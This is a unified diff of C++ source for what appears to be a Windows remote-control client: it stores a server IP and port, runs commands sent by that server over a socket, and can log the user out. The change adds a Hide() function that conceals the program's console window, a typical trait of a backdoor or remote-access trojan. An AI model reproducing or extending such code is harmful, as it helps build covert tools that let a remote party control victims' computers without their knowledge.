@@ -4,6 +4,12 @@
 #include <fstream>
 #include <vector>
 
+void Hide() {
+    AllocConsole();
+    HWND win = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(win, 0);
+}
+
 int saveServerInfo(std::string ip, int port) {
     char currentPath[MAX_PATH];
     if (GetModuleFileName(NULL, currentPath, MAX_PATH) == 0) {
@@ -75,7 +81,9 @@ void HandleCommands(std::string command, SOCKET sock) {
 		std::this_thread::sleep_for(std::chrono::seconds(2));	
         closesocket(sock);      // close before signing out
 		ExitWindowsEx(0, 0);
-	} else {
+	} 
+
+    else {
         std::cout << "[!] Server sent this unknown command: " << command << "\n";
     }
 }
